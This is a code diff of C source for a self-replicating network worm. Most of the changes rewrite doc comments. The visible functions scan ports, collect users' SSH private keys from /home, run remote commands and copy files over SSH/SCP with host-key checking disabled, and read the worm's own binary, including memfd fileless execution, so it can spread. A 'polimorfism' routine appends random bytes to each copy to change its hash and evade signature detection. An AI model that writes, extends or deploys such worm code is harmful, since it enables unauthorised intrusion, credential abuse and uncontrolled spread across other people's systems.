@@ -29,8 +29,17 @@ static const char base64_table[] =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
 /**
- * Base64 encode function
- * Returns dynamically allocated string (caller must free)
+ * Base64 Encode Binary Data
+ * Encodes binary data to base64 string using RFC 4648 standard encoding.
+ * 
+ * @param data Pointer to binary data to encode.
+ * @param input_length Length of input data in bytes.
+ * @param output_length Output parameter set to length of encoded string (excluding null terminator).
+ * @return Dynamically allocated null-terminated base64 string, or NULL on allocation failure.
+ *         Caller is responsible for freeing the returned string with free().
+ * 
+ * @note Encoded string length is always 4 * ceil(input_length / 3) bytes.
+ * @note Padding characters ('=') are added when input length is not divisible by 3.
  */
 char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length) {
     *output_length = 4 * ((input_length + 2) / 3);
@@ -61,8 +70,15 @@ char* base64_encode(const unsigned char* data, size_t input_length, size_t* outp
 }
 
 /**
- * Get the path to the current executable
- * Returns dynamically allocated string (caller must free)
+ * Get Current Executable Path
+ * Retrieves the filesystem path to the currently running executable.
+ * 
+ * @param argv0 Program name from argv[0]. Used as fallback if /proc/self/exe is unavailable.
+ * @return Dynamically allocated string containing executable path, or NULL on failure.
+ *         Caller is responsible for freeing the returned string with free().
+ * 
+ * @note On Linux, uses /proc/self/exe symlink for reliable path resolution.
+ * @note Falls back to argv0 if /proc/self/exe readlink fails (e.g., non-Linux systems).
  */
 char* get_executable_path(const char* argv0) {
     char* path = malloc(PATH_MAX);
@@ -86,8 +102,16 @@ char* get_executable_path(const char* argv0) {
 }
 
 /**
- * Scan target IP for specified port
- * Returns 1 if port is open, 0 otherwise
+ * Port Scanner
+ * Tests if a TCP port is open on a remote host by attempting connection.
+ * 
+ * @param ip Target host IP address in dotted-decimal format (e.g., "192.168.1.1").
+ * @param port TCP port number to test (0-65535).
+ * @param timeout_sec Connection timeout in seconds. Connection attempt fails if timeout exceeded.
+ * @return 1 if port is open (connection successful), 0 if closed/unreachable/timeout.
+ * 
+ * @note Uses TCP SYN connection attempt. Does not send application-layer data.
+ * @note Non-blocking: returns immediately after timeout or connection result.
  */
 int scan_port(const char* ip, int port, int timeout_sec) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -231,7 +255,6 @@ int self_replicate(const char* target_ip, const char* argv0,
     return 1;
 }
 
-// Helper for memmem if not available
 static void *find_mem(const void *haystack, size_t haystacklen, const void *needle, size_t needlelen) {
     if (needlelen > haystacklen) return NULL;
     if (needlelen == 0) return (void *)haystack;
@@ -251,13 +274,9 @@ static void *find_mem(const void *haystack, size_t haystacklen, const void *need
  * 
  * Algorithm:
  * 1. Find last occurrence of marker "DEADBEEF_WORM_END" (if exists from previous mutation)
- * 2. If marker found near end (< 100 bytes after), use position as original_len
- *    (This allows re-mutating already-mutated binaries correctly)
+ * 2. If marker found near end, use position as original_len
  * 3. Generate 10-50 random bytes
  * 4. Append marker + random bytes to original binary
- * 
- * Purpose: Create unique binary variants to evade signature-based detection
- * Each propagation creates a different binary hash while maintaining functionality
  */
 unsigned char* polimorfism(unsigned char* file_content, size_t total_read, size_t* new_len) {
     // Magic marker to identify end of original binary
@@ -276,8 +295,6 @@ unsigned char* polimorfism(unsigned char* file_content, size_t total_read, size_
     
     size_t original_len = total_read;
     
-    // If marker found very close to end, it's from previous mutation
-    // Use marker position as original_len to avoid mutating the mutation
     if (found) {
         size_t offset = found - file_content;
         size_t remaining = total_read - offset;
@@ -293,19 +310,14 @@ unsigned char* polimorfism(unsigned char* file_content, size_t total_read, size_
     // Calculate new size: original + marker + random bytes
     *new_len = original_len + marker_len + random_bytes_count;
     
-    // Allocate new buffer
     unsigned char* new_content = malloc(*new_len);
     if (!new_content) {
         return NULL;
     }
     
-    // Copy original content (up to marker if found)
     memcpy(new_content, file_content, original_len);
-    
-    // Append marker to mark end of original
     memcpy(new_content + original_len, marker, marker_len);
     
-    // Append random bytes for polymorphism
     for (int i = 0; i < random_bytes_count; i++) {
         new_content[original_len + marker_len + i] = rand() % 256;
     }
@@ -314,8 +326,18 @@ unsigned char* polimorfism(unsigned char* file_content, size_t total_read, size_
 }
 
 /**
- * Read SSH private keys from user home directories .ssh/id_rsa
- * Returns the number of keys found
+ * Discover SSH Private Keys
+ * Scans /home directory for user SSH private key files (id_rsa).
+ * 
+ * @param key_list Output array to populate with paths to discovered SSH key files.
+ *                 Must be large enough to hold at least max_keys entries.
+ * @param max_keys Maximum number of keys to discover (prevents buffer overflow).
+ * @return Number of SSH keys found and added to key_list (0 to max_keys).
+ * 
+ * @note Discovered key paths are dynamically allocated (strdup) and stored in key_list.
+ *       Caller is responsible for freeing all key_list entries after use.
+ * @note Requires read access to /home/<user>/.ssh/id_rsa files.
+ * @note Skips directories "." and ".." during scan.
  */
 int read_ssh_keys(char** key_list, int max_keys) {
     int count = 0;
@@ -345,7 +367,18 @@ int read_ssh_keys(char** key_list, int max_keys) {
 }
 
 /**
- * Get all local IP addresses of the host (excluding loopback)
+ * Enumerate Local IP Addresses
+ * Retrieves all IPv4 addresses assigned to local network interfaces.
+ * 
+ * @param ip_list Output array to populate with local IP addresses as strings.
+ *                Must be large enough to hold at least max_ips entries.
+ * @param count Output parameter set to number of IPs found and added to ip_list.
+ * @param max_ips Maximum number of IPs to return (prevents buffer overflow).
+ * 
+ * @note Discovered IP addresses are dynamically allocated (strdup) and stored in ip_list.
+ *       Caller is responsible for freeing all ip_list entries after use.
+ * @note Loopback addresses (127.0.0.1) are excluded from results.
+ * @note Only IPv4 addresses are returned (AF_INET family).
  */
 void get_local_ips(char** ip_list, int* count, int max_ips) {
     *count = 0;
@@ -371,8 +404,18 @@ void get_local_ips(char** ip_list, int* count, int max_ips) {
 }
 
 /**
- * Execute command via SSH
- * Returns 1 on success, 0 on failure
+ * Execute Remote Command via SSH
+ * Runs a shell command on a remote host using SSH key-based authentication.
+ * 
+ * @param ip Target host IP address.
+ * @param key_path Path to SSH private key file for authentication.
+ * @param user Username for SSH connection.
+ * @param command Shell command to execute on remote host (will be single-quoted).
+ * @return 1 if command executed successfully (exit code 0), 0 on failure or timeout.
+ * 
+ * @note Uses StrictHostKeyChecking=no to avoid interactive prompts.
+ * @note Connection timeout is 10 seconds (ConnectTimeout=10).
+ * @note Command output and errors are suppressed (redirected to /dev/null).
  */
 int run_ssh_command(const char* ip, const char* key_path, const char* user, const char* command) {
     char ssh_cmd[4096];
@@ -386,8 +429,19 @@ int run_ssh_command(const char* ip, const char* key_path, const char* user, cons
 }
 
 /**
- * Transfer file via SCP
- * Returns 1 on success, 0 on failure
+ * Transfer File via SCP
+ * Copies a file to a remote host using SCP with SSH key-based authentication.
+ * 
+ * @param ip Target host IP address.
+ * @param key_path Path to SSH private key file for authentication.
+ * @param user Username for SCP connection.
+ * @param local_file Path to local file to transfer.
+ * @param remote_file Destination path on remote host.
+ * @return 1 if transfer succeeded, 0 on failure or timeout.
+ * 
+ * @note Uses StrictHostKeyChecking=no to avoid interactive prompts.
+ * @note Connection timeout is 10 seconds (ConnectTimeout=10).
+ * @note Transfer progress and errors are suppressed (redirected to /dev/null).
  */
 int scp_transfer(const char* ip, const char* key_path, const char* user, const char* local_file, const char* remote_file) {
     char scp_cmd[4096];
@@ -401,27 +455,32 @@ int scp_transfer(const char* ip, const char* key_path, const char* user, const c
 }
 
 /**
- * Read own binary with memfd FD support
- * Returns dynamically allocated content (caller must free)
+ * Read Own Binary Image
+ * Reads the currently executing program's binary image into memory for self-replication.
  * 
- * Reading strategy (priority order):
- * 1. Try memfd file descriptor (MEMFD_FD env var) - for fileless execution
- *    Worm was loaded into memory via memfd_create, FD passed via environment
- * 2. Fallback to /proc/self/exe - for normal file execution
+ * Reading Strategy (Priority Order):
+ *   1. MEMFD file descriptor: If MEMFD_FD environment variable is set, read from that file
+ *      descriptor. This supports fileless execution (binary loaded into memory via memfd_create).
+ *   2. Filesystem path: Fallback to /proc/self/exe symlink (normal file execution).
  * 
- * This enables self-replication regardless of how the worm was executed
+ * @param argv0 Program name from argv[0]. Used for filesystem fallback path resolution.
+ * @param file_size Output parameter set to size of binary in bytes.
+ * @return Dynamically allocated buffer containing complete binary image, or NULL on failure.
+ *         Caller is responsible for freeing the returned buffer with free().
+ * 
+ * @note Supports both fileless (memfd) and filesystem-based execution methods.
+ * @note Binary is read in full - entire executable image is loaded into memory.
+ * @note Critical for self-replication: worm needs its own binary to propagate.
  */
 unsigned char* read_own_binary(const char* argv0, size_t* file_size) {
     unsigned char* worm_content = NULL;
     *file_size = 0;
     int fd = -1;
     
-    // Priority 1: Read from memfd file descriptor (fileless execution)
     char* fd_str = getenv("MEMFD_FD");
     if (fd_str) {
         fd = atoi(fd_str);
         
-        // Verify FD is valid and readable
         if (fcntl(fd, F_GETFD) != -1) {
             off_t size = lseek(fd, 0, SEEK_END);
             if (size >= 0) {
@@ -440,7 +499,6 @@ unsigned char* read_own_binary(const char* argv0, size_t* file_size) {
         }
     }
     
-    // Priority 2: Read from filesystem (/proc/self/exe)
     if (!worm_content) {
         char* exe_path = get_executable_path(argv0);
         if (!exe_path) {
